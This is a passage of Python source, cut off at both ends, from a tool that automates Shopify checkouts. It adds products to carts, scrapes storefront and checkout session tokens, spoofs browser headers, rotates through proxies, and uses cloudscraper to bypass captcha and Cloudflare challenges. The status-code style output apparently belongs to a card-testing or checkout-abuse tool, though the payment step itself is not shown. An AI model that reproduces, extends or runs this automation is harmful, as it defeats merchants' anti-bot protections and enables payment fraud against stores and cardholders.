                    output.update({"Response": f"CART_ADD_HTTP_{add_sc}", "Status": False})
                    _log_output_to_terminal(output)
                    return output
                try:
                    add_data = add_js_resp.json() if hasattr(add_js_resp, "json") else {}
                    if isinstance(add_data, dict) and add_data.get("status") == 422:
                        output.update({"Response": "CART_ADD_REJECTED", "Status": False})
                        _log_output_to_terminal(output)
                        return output
                except Exception:
                    pass
                await asyncio.sleep(0.5)
                checkout_post_resp = await session.post(
                    f"{url.rstrip('/')}/checkout",
                    headers={
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                        "Pragma": "no-cache",
                        "Accept": "*/*",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Origin": url.rstrip("/"),
                        "Referer": url.rstrip("/") + "/",
                    },
                    data="",
                    timeout=18,
                    follow_redirects=False,
                )
                post_sc = getattr(checkout_post_resp, "status_code", 0)
                if post_sc in (301, 302, 303, 307, 308):
                    resp_headers = getattr(checkout_post_resp, "headers", None) or {}
                    loc = resp_headers.get("location") or resp_headers.get("Location") or ""
                    if loc:
                        if not loc.startswith("http"):
                            loc = urljoin(url.rstrip("/") + "/", loc)
                        checkout_url = loc
                    else:
                        checkout_url = url.rstrip("/") + "/checkout"
                else:
                    checkout_url = url.rstrip("/") + "/checkout"
            except Exception as e:
                output.update({"Response": f"CART_ADD_ERROR: {str(e)[:40]}", "Status": False})
                _log_output_to_terminal(output)
                return output
        else:
            try:
                request = await session.get(url, follow_redirects=True, timeout=20)
                if not request or request.status_code == 0:
                    output.update({
                        "Response": "SITE_CONNECTION_ERROR",
                        "Status": False,
                    })
                    _log_output_to_terminal(output)
                    return output
            except Exception as e:
                output.update({
                    "Response": f"SITE_CONNECTION_ERROR: {str(e)[:50]}",
                    "Status": False,
                })
                _log_output_to_terminal(output)
                return output

            # Ensure request has text attribute
            if not hasattr(request, 'text') or not request.text:
                output.update({
                    "Response": "SITE_EMPTY_RESPONSE",
                    "Status": False,
                })
                _log_output_to_terminal(output)
                return output

            request_text_for_capture = (request.text or "") if request and hasattr(request, 'text') else ""
            # If store page is HTML with captcha and no token, try cloudscraper (captcha bypass)
            if (not request_text_for_capture.strip().startswith("{") and
                any(x in (request_text_for_capture or "").lower() for x in ["captcha", "hcaptcha", "recaptcha", "challenge", "verify"])):
                if HAS_CLOUDSCRAPER:
                    try:
                        cs_sc, cs_store = await asyncio.to_thread(_fetch_store_page_cloudscraper_sync, url, proxy)
                        if cs_sc == 200 and cs_store:
                            request_text_for_capture = cs_store
                            logger.info(f"Store page via cloudscraper bypass for {url}")
                    except Exception:
                        pass

            site_key = (
                _capture_multi(
                    request_text_for_capture,
                    ('"accessToken":"', '"'),
                    ("'accessToken':'", "'"),
                    ('accessToken":"', '"'),
                    ('storefrontAccessToken":"', '"'),
                    ('StorefrontApiAccessToken":"', '"'),
                )
                or capture(request_text_for_capture, '"accessToken":"', '"')
            )
            if not site_key:
                m = re.search(r'["\']accessToken["\']\s*:\s*["\']([a-zA-Z0-9]+)["\']', request_text_for_capture)
                if m:
                    site_key = m.group(1)
            if not site_key:
                m = re.search(r'storefrontAccessToken["\']?\s*:\s*["\']([a-zA-Z0-9]+)["\']', request_text_for_capture, re.I)
                if m:
                    site_key = m.group(1)

            # Bulletproof: if store page was HTML but no token found, try cloudscraper (e.g. challenge page)
            if (not site_key or not str(site_key).strip()) and request_text_for_capture.strip().startswith("<") and HAS_CLOUDSCRAPER:
                try:
                    cs_sc, cs_store = await asyncio.to_thread(_fetch_store_page_cloudscraper_sync, url, proxy)
                    if cs_sc == 200 and cs_store:
                        request_text_for_capture = cs_store
                        logger.info(f"Store page via cloudscraper (no token in HTML) for {url}")
                        site_key = (
                            _capture_multi(
                                request_text_for_capture,
                                ('"accessToken":"', '"'),
                                ("'accessToken':'", "'"),
                                ('accessToken":"', '"'),
                                ('storefrontAccessToken":"', '"'),
                                ('StorefrontApiAccessToken":"', '"'),
                            )
                            or capture(request_text_for_capture, '"accessToken":"', '"')
                        )
                        if not site_key:
                            m = re.search(r'["\']accessToken["\']\s*:\s*["\']([a-zA-Z0-9]+)["\']', request_text_for_capture)
                            if m:
                                site_key = m.group(1)
                        if not site_key:
                            m = re.search(r'storefrontAccessToken["\']?\s*:\s*["\']([a-zA-Z0-9]+)["\']', request_text_for_capture, re.I)
                            if m:
                                site_key = m.group(1)
                except Exception:
                    pass

            # print(f"{product_id}\n{price}\n{site_key}")
            checkout_url = None
            # Fallback when Storefront API token missing: try low-product API first (add.js + POST checkout), then product page, then form cart/add
            if not site_key or not str(site_key).strip():
                # 1) Try low-product API fallback: add.js + POST checkout (no site_key needed)
                try:
                    low_fallback = await _fetch_low_product_api(domain, session, proxy)
                    if low_fallback and low_fallback.get("variantid") is not None:
                        vid = low_fallback["variantid"]
                        add_js_h = {
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                            "Pragma": "no-cache",
                            "Accept": "*/*",
                            "Content-Type": "application/json",
                            "Origin": url.rstrip("/"),
                            "Referer": url.rstrip("/") + "/",
                        }
                        add_js_r = await session.post(
                            f"{url.rstrip('/')}/cart/add.js",
                            headers=add_js_h,
                            json={"items": [{"id": vid, "quantity": 1}]},
                            timeout=18,
                        )
                        if getattr(add_js_r, "status_code", 0) == 200:
                            await asyncio.sleep(0.5)
                            ch_post = await session.post(
                                f"{url.rstrip('/')}/checkout",
                                headers={
                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                    "Pragma": "no-cache",
                                    "Accept": "*/*",
                                    "Content-Type": "application/x-www-form-urlencoded",
                                    "Origin": url.rstrip("/"),
                                    "Referer": url.rstrip("/") + "/",
                                },
                                data="",
                                timeout=18,
                                follow_redirects=False,
                            )
                            post_sc = getattr(ch_post, "status_code", 0)
                            if post_sc in (301, 302, 303, 307, 308):
                                resp_h = getattr(ch_post, "headers", None) or {}
                                loc = resp_h.get("location") or resp_h.get("Location") or ""
                                if loc:
                                    if not loc.startswith("http"):
                                        loc = urljoin(url.rstrip("/") + "/", loc)
                                    checkout_url = loc
                                else:
                                    checkout_url = url.rstrip("/") + "/checkout"
                            else:
                                checkout_url = url.rstrip("/") + "/checkout"
                            if checkout_url:
                                logger.info(f"Checkout via low-product API fallback (no site_key) for {url}")
                except Exception as e:
                    logger.debug(f"Low-product API fallback failed: {e}")

                if not checkout_url:
                    # 2) Establish session and optionally get site_key from product page (many themes put token only there)
                    try:
                        prod_resp = await session.get(f'{url.rstrip("/")}/products.json', headers={'User-Agent': getua, 'Accept': 'application/json'}, follow_redirects=True, timeout=15)
                        prod_text = (getattr(prod_resp, 'text', None) or '') if prod_resp else ''
                        if getattr(prod_resp, 'status_code', 0) == 200 and prod_text.strip().startswith('{'):
                            handle = _first_product_handle_from_json_text(prod_text)
                            if handle:
                                await asyncio.sleep(0.2)
                                page_resp = await session.get(f'{url.rstrip("/")}/products/{handle}', headers={'User-Agent': getua, 'Accept': 'text/html,application/xhtml+xml,*/*;q=0.8'}, follow_redirects=True, timeout=15)
                                page_text = (getattr(page_resp, 'text', None) or '') if page_resp else ''
                                if page_text:
                                    for (a, b) in [('"accessToken":"', '"'), ("'accessToken':'", "'"), ('accessToken":"', '"'), ('storefrontAccessToken":"', '"')]:
                                        try:
                                            tok = capture(page_text, a, b)
                                            if tok and str(tok).strip():
                                                site_key = tok.strip()
                                                logger.info(f"Site key from product page /products/{handle} for {url}")
                                                break
                                        except Exception:
                                            pass
                                    if not site_key:
                                        mm = re.search(r'["\']accessToken["\']\s*:\s*["\']([a-zA-Z0-9]+)["\']', page_text)
                                        if mm:
                                            site_key = mm.group(1)
                        await asyncio.sleep(0.2)
                    except Exception as e:
                        logger.debug(f"Product page token fetch: {e}")
                    # If still no site_key, add to cart via form so we can hit /checkout
                    if not site_key or not str(site_key).strip():
                        add_headers = {
                            'User-Agent': getua,
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Origin': url.rstrip('/'),
                            'Referer': url.rstrip('/') + '/',
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'sec-ch-ua': '"Chromium";v="144", "Not(A:Brand";v="8"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': f'"{clienthint}"',
                            'sec-fetch-dest': 'document',
                            'sec-fetch-mode': 'navigate',
                            'sec-fetch-site': 'same-origin',
                            'sec-fetch-user': '?1',
                            'upgrade-insecure-requests': '1',
                        }
                        vid = product_id
                        try:
                            if isinstance(vid, str) and vid.isdigit():
                                vid = int(vid)
                        except (ValueError, TypeError):
                            pass
                        variant_id_str = str(vid) if vid is not None else ''
                        for cart_attempt in range(3):
                            try:
                                if cart_attempt == 0:
                                    await session.get(url.rstrip('/'), headers={'User-Agent': getua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}, follow_redirects=True, timeout=12)
                                    await asyncio.sleep(0.3)
                                add_resp = await session.post(
                                    f'{url.rstrip("/")}/cart/add',
                                    headers=add_headers,
                                    data={'id': variant_id_str, 'quantity': '1', 'form_type': 'product'},
                                    timeout=18,
                                    follow_redirects=True,
                                )
                                sc = getattr(add_resp, 'status_code', 0)
                                if sc in (200, 302, 303):
                                    checkout_url = url.rstrip('/') + '/checkout'
                                    await asyncio.sleep(0.6)
                                    logger.info(f"Cart/add succeeded for {url} (attempt {cart_attempt + 1})")
                                    break
                                if sc >= 400 and variant_id_str:
                                    add_js_resp = await session.post(
                                        f'{url.rstrip("/")}/cart/add.js',
                                        headers={'User-Agent': getua, 'Content-Type': 'application/json', 'Accept': 'application/json', 'Origin': url.rstrip('/'), 'Referer': url.rstrip('/') + '/'},
                                        json={'items': [{'id': vid if isinstance(vid, int) else int(vid) if str(vid).isdigit() else vid, 'quantity': 1}]},
                                        timeout=18,
                                    )
                                    if getattr(add_js_resp, 'status_code', 0) == 200:
                                        try:
                                            js = add_js_resp.json() if hasattr(add_js_resp, 'json') else {}
                                            if isinstance(js, dict) and (js.get('id') or js.get('items') or 'id' in str(js)):
                                                checkout_url = url.rstrip('/') + '/checkout'
                                                await asyncio.sleep(0.6)
                                                logger.info(f"Cart/add.js succeeded for {url}")
                                                break
                                        except Exception:
                                            pass
                            except Exception as e:
                                logger.debug(f"Cart/add attempt {cart_attempt + 1} failed: {e}")
                            if cart_attempt < 2:
                                await asyncio.sleep(0.5 + cart_attempt * 0.3)
                        if not checkout_url:
                            output.update({
                                "Response": "SITE_ACCESS_TOKEN_MISSING",
                                "Status": False,
                            })
                            _log_output_to_terminal(output)
                            return output

            if site_key and str(site_key).strip():
                headers = {
                    'accept': 'application/json',
                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                    'content-type': 'application/json',
                    'origin': url,
                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                    'sec-ch-ua-mobile': f'{mobile}',
                    'sec-ch-ua-platform': f'"{clienthint}"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': f'{getua}',
                    'x-sdk-variant': 'portable-wallets',
                    'x-shopify-storefront-access-token': site_key,
                    'x-start-wallet-checkout': 'true',
                    'x-wallet-name': 'MoreOptions'
                }

                params = {
                    'operation_name': 'cartCreate',
                }

                json_data = {
                    'query': 'mutation cartCreate($input:CartInput!$country:CountryCode$language:LanguageCode$withCarrierRates:Boolean=false)@inContext(country:$country language:$language){result:cartCreate(input:$input){...@defer(if:$withCarrierRates){cart{...CartParts}errors:userErrors{...on CartUserError{message field code}}warnings:warnings{...on CartWarning{code}}}}}fragment CartParts on Cart{id checkoutUrl deliveryGroups(first:10 withCarrierRates:$withCarrierRates){edges{node{id groupType selectedDeliveryOption{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}deliveryOptions{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}}}}cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}totalTaxAmount{amount currencyCode}totalDutyAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}discountCodes{code applicable}lines(first:10){edges{node{quantity cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}merchandise{...on ProductVariant{requiresShipping}}sellingPlanAllocation{priceAdjustments{price{amount currencyCode}}sellingPlan{billingPolicy{...on SellingPlanRecurringBillingPolicy{interval intervalCount}}priceAdjustments{orderCount}recurringDeliveries}}}}}}',
                    'operationName': 'cartCreate',
                    'variables': {
                        'input': {
                            'lines': [
                                {
                                    'merchandiseId': f'gid://shopify/ProductVariant/{product_id}',
                                    'quantity': 1,
                                    'attributes': [],
                                },
                            ],
                            'discountCodes': [],
                        },
                        'country': 'US',
                        'language': 'EN',
                    },
                }

                # Try multiple Storefront API endpoints (different Shopify versions)
                cart_endpoints = [
                    f'{url}/api/unstable/graphql.json',
                    f'{url}/api/2024-01/graphql.json',
                    f'{url}/api/2023-10/graphql.json',
                    f'{url}/api/2023-07/graphql.json',
                    f'{url}/api/2023-04/graphql.json',
                ]
                response = None
                last_cart_error = None
                for cart_url in cart_endpoints:
                    try:
                        response = await session.post(cart_url, params=params, headers=headers, json=json_data, timeout=18, follow_redirects=True)
                        if response and getattr(response, "status_code", 0) == 200:
                            resp_text = (response.text or "").strip()
                            if resp_text.startswith("{") and "checkoutUrl" in resp_text:
                                break
                        if response and getattr(response, "status_code", 0) == 404:
                            continue
                    except Exception as e:
                        last_cart_error = str(e)[:80]
                        continue
                if not response or getattr(response, "status_code", 0) != 200:
                    output.update({
                        "Response": f"CART_HTTP_ERROR: {(last_cart_error or 'all endpoints failed')[:50]}",
                        "Status": False,
                    })
                    _log_output_to_terminal(output)
                    return output

                # Parse cart creation response with error handling
                try:
                    response_text = response.text if response.text else ""
                    if response_text.strip().startswith("<"):
                        if any(x in response_text.lower() for x in ["captcha", "hcaptcha", "recaptcha"]):
                            output.update({"Response": "HCAPTCHA_DETECTED", "Status": False})
                            _log_output_to_terminal(output)
                            return output
                        output.update({"Response": "CART_HTML_ERROR", "Status": False})
                        _log_output_to_terminal(output)
                        return output
                    if not hasattr(response, 'json'):
                        output.update({"Response": "CART_NO_JSON_METHOD", "Status": False})
                        _log_output_to_terminal(output)
                        return output
                    try:
                        response_data = response.json()
                        if not response_data and (response.text or "").strip().startswith("{"):
                            response_data = json.loads(response.text)
                    except (json.JSONDecodeError, TypeError, AttributeError) as e:
                        output.update({"Response": f"CART_JSON_ERROR: {str(e)[:50]}", "Status": False})
                        _log_output_to_terminal(output)
                        return output
                    if not response_data or not isinstance(response_data, dict):
                        output.update({"Response": "CART_INVALID_DATA", "Status": False})
                        _log_output_to_terminal(output)
                        return output
                    if "errors" in response_data and response_data.get("errors"):
                        error_msg = response_data["errors"][0].get("message", "GRAPHQL_ERROR")
                        output.update({"Response": f"CART_ERROR: {error_msg[:50]}", "Status": False})
                        _log_output_to_terminal(output)
                        return output
                    checkout_url = _get_checkout_url_from_cart_response(response_data)
                    if not checkout_url:
                        output.update({"Response": "CART_NO_CHECKOUT_URL", "Status": False})
                        _log_output_to_terminal(output)
                        return output
                    # Bulletproof: if checkout URL is on different host, session cookies won't carry cart; use same-origin
                    try:
                        store_netloc = (urlparse(url).netloc or "").lower().strip()
                        checkout_netloc = (urlparse(checkout_url).netloc or "").lower().strip()
                        if store_netloc and checkout_netloc and store_netloc != checkout_netloc:
                            add_headers = {
                                'User-Agent': getua,
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Origin': url,
                                'Referer': url,
                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            }
                            add_resp = await session.post(
                                f'{url}/cart/add',
                                headers=add_headers,
                                data={'id': product_id, 'quantity': 1},
                                timeout=15,
                                follow_redirects=True,
                            )
                            if add_resp and getattr(add_resp, 'status_code', 0) in (200, 302):
                                checkout_url = url.rstrip('/') + '/checkout'
                                await asyncio.sleep(0.6)
                                logger.info(f"Using same-origin checkout for {url} (external checkout URL)")
                    except Exception:
                        pass
                except json.JSONDecodeError:
                    output.update({"Response": "CART_INVALID_JSON", "Status": False})
                    _log_output_to_terminal(output)
                    return output
                except (KeyError, TypeError):
                    output.update({"Response": "CART_CREATION_FAILED", "Status": False})
                    _log_output_to_terminal(output)
                    return output

        await asyncio.sleep(0.35)
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': f'"{clienthint}"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': f'{mobile}',
            'upgrade-insecure-requests': '1',
            'user-agent': f'{getua}',
        }

        params = {
            'auto_redirect': 'false',
        }

        request = None
        checkout_sc = 0
        checkout_text = ""
        store_netloc_check = (urlparse(url).netloc or "").lower().strip()
        for _checkout_attempt in range(6):
            # First try without following redirects to detect cross-host redirect (session cookies wouldn't be sent)
            req = await session.get(checkout_url, headers=headers, params=params, follow_redirects=False, timeout=18)
            checkout_sc = getattr(req, "status_code", 0)
            checkout_text = req.text if req.text else ""
            if checkout_sc in (301, 302, 303, 307, 308):
                location = (getattr(req, "headers", None) or {}).get("location") or (getattr(req, "headers", None) or {}).get("Location") or ""
                if location and store_netloc_check:
                    try:
                        loc_parsed = urlparse(location if location.startswith("http") else f"https://{location}")
                        loc_netloc = (loc_parsed.netloc or "").lower().strip()
                        if loc_netloc and loc_netloc != store_netloc_check:
                            add_h = {'User-Agent': getua, 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': url, 'Referer': url, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
                            add_r = await session.post(f'{url}/cart/add', headers=add_h, data={'id': product_id, 'quantity': 1}, timeout=15, follow_redirects=True)
                            if add_r and getattr(add_r, 'status_code', 0) in (200, 302):
                                await asyncio.sleep(0.6)
                                checkout_url = url.rstrip('/') + '/checkout'
                                req = await session.get(checkout_url, headers=headers, params=params, follow_redirects=True, timeout=18)
                                checkout_sc = getattr(req, "status_code", 0)
                                checkout_text = req.text if req.text else ""
                    except Exception:
                        pass
            if checkout_sc == 200:
                request = req
                break
            if checkout_sc in (301, 302, 303, 307, 308) and _checkout_attempt == 0:
                req = await session.get(checkout_url, headers=headers, params=params, follow_redirects=True, timeout=18)
                checkout_sc = getattr(req, "status_code", 0)
                checkout_text = req.text if req.text else ""
                if checkout_sc == 200:
                    request = req
                    break
            if checkout_sc in (429, 502, 503, 504) and _checkout_attempt < 5:
                backoff = 2.0 + _checkout_attempt * 1.0 if checkout_sc == 429 else 1.0 + _checkout_attempt * 0.7
                await asyncio.sleep(backoff)
                continue
            break
        if request is None and checkout_sc != 200:
            output.update({
                "Response": f"CHECKOUT_HTTP_{checkout_sc}",
                "Status": False,
            })
            _log_output_to_terminal(output)
            return output
        checkout_lower = checkout_text.lower()

        if checkout_text.strip().startswith("<"):
            if any(x in checkout_lower for x in ["captcha", "hcaptcha", "recaptcha", "challenge", "verify"]):
                if HAS_CLOUDSCRAPER:
                    try:
                        cs_sc, cs_text = await asyncio.to_thread(
                            _fetch_checkout_cloudscraper_sync, checkout_url, proxy
                        )
                        if cs_sc == 200 and cs_text and ("serialized-session-token" in cs_text or "serialized-sessionToken" in cs_text) and ("serialized-source-token" in cs_text or "serializedSourceToken" in cs_text):
                            checkout_text = cs_text
                            checkout_lower = checkout_text.lower()
                        else:
                            output.update({"Response": "HCAPTCHA_DETECTED", "Status": False})
                            _log_output_to_terminal(output)
                            return output
                    except Exception:
                        output.update({"Response": "HCAPTCHA_DETECTED", "Status": False})
                        _log_output_to_terminal(output)
                        return output
                else:
                    output.update({"Response": "HCAPTCHA_DETECTED", "Status": False})
                    _log_output_to_terminal(output)
                    return output
            if "serialized-session-token" not in checkout_text and "serialized-sessionToken" not in checkout_text and "serialized-source-token" not in checkout_text:
                # May be challenge page (e.g. Cloudflare); try cloudscraper once before giving up
                if HAS_CLOUDSCRAPER:
                    try:
                        cs_sc, cs_text = await asyncio.to_thread(
                            _fetch_checkout_cloudscraper_sync, checkout_url, proxy
                        )
                        if cs_sc == 200 and cs_text and len(cs_text) > 1000:
                            if "serialized-session-token" in cs_text or "serialized-sessionToken" in cs_text or "serializedSessionToken" in cs_text:
                                checkout_text = cs_text
                                checkout_lower = checkout_text.lower()
                                logger.info(f"Checkout page via cloudscraper (no tokens in initial HTML) for {url}")
                    except Exception:
                        pass
                if "serialized-session-token" not in checkout_text and "serialized-sessionToken" not in checkout_text and "serialized-source-token" not in checkout_text and "serializedSessionToken" not in checkout_text:
                    output.update({"Response": "CHECKOUT_HTML_ERROR", "Status": False})
                    _log_output_to_terminal(output)
                    return output

        try:
            paymentMethodIdentifier = _capture_multi(
                checkout_text,
                ('paymentMethodIdentifier&quot;:&quot;', '&quot;'),
                ('paymentMethodIdentifier":"', '"'),
            ) or capture(checkout_text, "paymentMethodIdentifier&quot;:&quot;", "&quot;")
        except Exception:
            paymentMethodIdentifier = None
        try:
            stable_id = _capture_multi(
                checkout_text,
                ('stableId&quot;:&quot;', '&quot;'),
                ('stableId":"', '"'),
                ('"stableId":"', '"'),
            ) or capture(checkout_text, "stableId&quot;:&quot;", "&quot;")
            if not stable_id:
                m = re.search(r'"stableId"\s*:\s*"([^"]+)"', checkout_text)
                if m:
                    stable_id = m.group(1)
        except Exception:
            stable_id = None
        try:
            queue_token = _capture_multi(
                checkout_text,
                ('queueToken&quot;:&quot;', '&quot;'),
                ('queueToken":"', '"'),
                ('"queueToken":"', '"'),
            ) or capture(checkout_text, "queueToken&quot;:&quot;", "&quot;")
            if not queue_token:
                m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', checkout_text)
                if m:
                    queue_token = m.group(1)
        except Exception:
            queue_token = None
        try:
            currencyCode = _capture_multi(
                checkout_text,
                ('currencyCode&quot;:&quot;', '&quot'),
                ('currencyCode":"', '"'),
            ) or capture(checkout_text, "currencyCode&quot;:&quot;", "&quot")
        except Exception:
            currencyCode = None

        try:
            countryCode = capture(checkout_text, "countryCode&quot;:&quot;", "&quot") or capture(checkout_text, 'countryCode":"', '"')
        except Exception:
            countryCode = currencyCode

        # Session token: single canonical parser only — variable x_checkout_one_session_token used everywhere
        x_checkout_one_session_token = _extract_session_token(checkout_text)
        # Source token: same format <meta name="serialized-sourceToken" content="&quot;TOKEN&quot;"/>
        token = None
        if "serialized-sourceToken" in checkout_text or "serialized-source-token" in checkout_text:
            for pat in [
                r'name\s*=\s*["\']serialized-sourceToken["\'][^>]*?content\s*=\s*["\']&quot;(.+?)&quot;\s*"\s*/\s*>',
                r'name\s*=\s*["\']serialized-sourceToken["\'][^>]*?content\s*=\s*&quot;(.+?)&quot;\s*"\s*/\s*>',
            ]:
                m = re.search(pat, checkout_text, re.I | re.DOTALL)
                if m:
                    v = (m.group(1) or "").strip()
                    if v and len(v) > 10:
                        token = v
                        break
        if not token:
            token = _capture_multi(
                checkout_text,
                ('name="serialized-sourceToken" content="&quot;', '&quot;"/>'),
                ('name="serialized-sourceToken" content="&quot;', '&quot;" />'),
                ('serialized-sourceToken" content="&quot;', '&quot;"/>'),
                ('serialized-source-token" content="&quot;', '&quot'),
                ('serialized-source-token" content="', '"'),
                ('serialized-source-token&quot; content=&quot;&quot;', '&quot;'),
                ('name="serialized-source-token" content="', '"'),
                ("name='serialized-source-token' content='", "'"),
                ('serialized-source-token" content=\'', "'"),
            )
        if not token and 'serializedSourceToken' in checkout_text:
            m = re.search(r'"serializedSourceToken"\s*:\s*"([^"]+)"', checkout_text)
            if m:
                token = m.group(1)

        # Fill missing tokens from robust extractor; never overwrite primary session token
        robust_tokens = _extract_checkout_tokens_robust(checkout_text)
        if not x_checkout_one_session_token and robust_tokens.get("session_token"):
            x_checkout_one_session_token = robust_tokens["session_token"]
        if not token and robust_tokens.get("source_token"):
            token = robust_tokens["source_token"]
        if not queue_token and robust_tokens.get("queue_token"):
            queue_token = robust_tokens["queue_token"]
        if not stable_id and robust_tokens.get("stable_id"):
            stable_id = robust_tokens["stable_id"]

        web_build = None
        try:
            match = re.search(r'"sha"\s*:\s*"([a-fA-F0-9]{40})"', checkout_text)
            if match:
                web_build = match.group(1)
            if not web_build:
                match = re.search(r'sha&quot;:&quot;([a-fA-F0-9]{40})&quot;', checkout_text)
                if match:
                    web_build = match.group(1)
            if not web_build:
                web_build = capture(checkout_text, 'serialized-client-bundle-info" content="{&quot;browsers&quot;:&quot;latest&quot;,&quot;format&quot;:&quot;es&quot;,&quot;locale&quot;:&quot;en&quot;,&quot;sha&quot;:&quot;', '&quot;')
        except Exception:
            pass
        if not web_build or not str(web_build).strip():
            web_build = "a5ffb15727136fbf537411f8d32d7c41fb371075"

        if not x_checkout_one_session_token or not token or not queue_token or not stable_id:
            # Bulletproof: try same-origin checkout (cart/add + GET /checkout) so session cookies carry cart
            same_origin_checkout = url.rstrip('/') + '/checkout'
            try:
                add_headers_cart = {
                    'User-Agent': getua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': url,
                    'Referer': url,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                }
                add_resp = await session.post(
                    f'{url}/cart/add',
                    headers=add_headers_cart,
                    data={'id': product_id, 'quantity': 1},
                    timeout=15,
                    follow_redirects=True,
                )
                if add_resp and getattr(add_resp, 'status_code', 0) in (200, 302):
                    await asyncio.sleep(0.6)
                    req2 = await session.get(
                        same_origin_checkout,
                        headers={
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                            'sec-ch-ua-mobile': f'{mobile}',
                            'sec-ch-ua-platform': f'"{clienthint}"',
                            'sec-fetch-dest': 'document',
                            'sec-fetch-mode': 'navigate',
                            'sec-fetch-site': 'same-origin',
                            'sec-fetch-user': f'{mobile}',
                            'upgrade-insecure-requests': '1',
                            'user-agent': f'{getua}',
                        },
                        params={'auto_redirect': 'false'},
                        follow_redirects=True,
                        timeout=18,
                    )
                    if req2 and getattr(req2, 'status_code', 0) == 200 and getattr(req2, 'text', None):
                        new_text = (req2.text or "").strip()
                        if len(new_text) > 1000:
                            checkout_text = new_text
                            checkout_lower = checkout_text.lower()
                            robust2 = _extract_checkout_tokens_robust(checkout_text)
                            x_checkout_one_session_token = x_checkout_one_session_token or robust2.get("session_token")
                            token = token or robust2.get("source_token")
                            queue_token = queue_token or robust2.get("queue_token")
                            stable_id = stable_id or robust2.get("stable_id")
                            if x_checkout_one_session_token or token or queue_token or stable_id:
                                try:
                                    if not paymentMethodIdentifier:
                                        paymentMethodIdentifier = _capture_multi(checkout_text, ('paymentMethodIdentifier&quot;:&quot;', '&quot;'), ('paymentMethodIdentifier":"', '"')) or capture(checkout_text, "paymentMethodIdentifier&quot;:&quot;", "&quot;")
                                    if not currencyCode:
                                        currencyCode = _capture_multi(checkout_text, ('currencyCode&quot;:&quot;', '&quot'), ('currencyCode":"', '"')) or capture(checkout_text, "currencyCode&quot;:&quot;", "&quot")
                                    if not countryCode:
                                        countryCode = capture(checkout_text, "countryCode&quot;:&quot;", "&quot") or capture(checkout_text, 'countryCode":"', '"') or currencyCode
                                    if not web_build or not str(web_build).strip():
                                        match = re.search(r'"sha"\s*:\s*"([a-fA-F0-9]{40})"', checkout_text)
                                        if match:
                                            web_build = match.group(1)
                                except Exception:
                                    pass
                                logger.info(f"Checkout tokens via same-origin retry for {url}")
            except Exception:
                pass

            # Bulletproof: try checkout page via cloudscraper once (challenge/captcha page may lack tokens)
            if (not x_checkout_one_session_token or not token or not queue_token or not stable_id) and checkout_text.strip().startswith("<") and HAS_CLOUDSCRAPER:
                try:
                    cs_sc, cs_text = await asyncio.to_thread(
                        _fetch_checkout_cloudscraper_sync, checkout_url, proxy
                    )
                    if cs_sc == 200 and cs_text and len(cs_text) > 1000:
                        checkout_text = cs_text
                        checkout_lower = checkout_text.lower()
                        robust2 = _extract_checkout_tokens_robust(checkout_text)
                        x_checkout_one_session_token = x_checkout_one_session_token or robust2.get("session_token")
                        token = token or robust2.get("source_token")
                        queue_token = queue_token or robust2.get("queue_token")
                        stable_id = stable_id or robust2.get("stable_id")
                        # Re-extract other fields from new page when we had none
                        try:
                            if not paymentMethodIdentifier:
                                paymentMethodIdentifier = _capture_multi(checkout_text, ('paymentMethodIdentifier&quot;:&quot;', '&quot;'), ('paymentMethodIdentifier":"', '"')) or capture(checkout_text, "paymentMethodIdentifier&quot;:&quot;", "&quot;")
                            if not currencyCode:
